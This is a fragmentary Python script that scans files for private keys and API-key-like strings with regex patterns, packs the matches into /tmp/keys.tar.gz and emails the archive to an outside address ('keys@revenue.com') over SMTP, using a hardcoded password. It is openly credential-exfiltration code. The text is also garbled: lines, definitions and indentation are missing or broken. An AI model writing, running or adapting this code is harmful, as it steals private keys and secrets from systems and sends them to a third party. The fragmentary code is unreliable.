from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

SMTP_SERVER = 'mail.serverA.com'
SMTP_PORT = 587
SMTP_USER = 'agent@serverA.com'
SMTP_PASS = 'JY6!9p$qF@3r'
RECIPIENT = 'keys@revenue.com'

# Key detection patterns
KEY_PATTERNS = [
    r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----',
    r'[a-zA-Z0-9]{32}',
    r'[a-zA-Z0-9]{40}',
    r'[a-zA-Z0-9]{64}',

                if any(re.search(pattern, content) for pattern in KEY_PATTERNS):
                    found_keys.append(path)
        except:
            continue

# Package and transmit

    with tarfile.open('/tmp/keys.tar.gz', 'w:gz') as tar:
        for key_path in found_keys:
            tar.add(key_path)
    
    msg = MIMEMultipart()
    msg['Subject'] = f'Found {len(found_keys)} keys from Server A'
    msg['From'] = SMTP_USER

    with open('/tmp/keys.tar.gz', 'rb') as attachment:

        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename='serverA_keys.tar.gz')
        msg.attach(part)
    
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
